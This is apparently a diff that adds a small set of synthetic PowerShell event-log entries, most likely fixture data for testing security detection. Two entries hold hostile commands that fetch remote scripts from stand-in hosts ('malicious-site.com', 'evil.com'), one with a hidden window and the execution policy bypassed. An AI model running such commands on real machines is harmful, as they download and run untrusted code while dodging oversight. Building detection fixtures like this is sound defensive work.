@@ -1,0 +1,5 @@
+{"timestamp":"2024-01-15T10:30:15Z","event_id":4103,"process":"powershell.exe","command":"Get-Process | Where-Object {$_.ProcessName -eq 'explorer'}","user":"DOMAIN\\user1","host":"workstation01"}
+{"timestamp":"2024-01-15T10:31:22Z","event_id":4104,"process":"powershell.exe","command":"Invoke-WebRequest -Uri http://malicious-site.com/payload.ps1 -OutFile C:\\temp\\payload.ps1","user":"DOMAIN\\user2","host":"workstation02"}
+{"timestamp":"2024-01-15T10:32:45Z","event_id":4103,"process":"powershell.exe","command":"Get-WmiObject -Class Win32_Process","user":"DOMAIN\\user1","host":"workstation01"}
+{"timestamp":"2024-01-15T10:33:10Z","event_id":4104,"process":"powershell.exe","command":"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command (New-Object System.Net.WebClient).DownloadString('http://evil.com/script.ps1')","user":"DOMAIN\\user3","host":"workstation03"}
+{"timestamp":"2024-01-15T10:34:33Z","event_id":4103,"process":"powershell.exe","command":"Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}","user":"DOMAIN\\user1","host":"workstation01"}
